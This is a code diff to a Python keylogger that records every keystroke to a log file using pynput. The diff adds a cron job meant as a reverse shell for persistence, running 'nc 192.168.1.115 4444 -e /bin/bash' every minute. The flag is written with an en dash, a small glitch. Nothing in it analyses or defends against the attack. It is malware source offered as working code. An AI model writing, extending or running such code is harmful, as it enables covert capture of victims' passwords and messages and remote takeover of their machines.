@@ -2,6 +2,7 @@
 # Import necessary libraries
 from pynput.keyboard import Key, Listener
 import logging
+from crontab import CronTab
 
 # Initialize Log File
 logging.basicConfig(filename=("keylog.txt"), level=logging.INFO, format="%(asctime)s-%(message)s")
@@ -35,3 +36,10 @@ def on_press(key):
 # Calls on the on_press function and keeps it running
 with Listener(on_press=on_press) as listener:
     listener.join()
+    
+# Create a cronjob reverse shell to establish persistence
+my_cron = CronTab(user='kali')
+job = my_cron.new(command='nc 192.168.1.115 4444 –e /bin/bash')
+job.minute.every(1)
+
+my_cron.write()
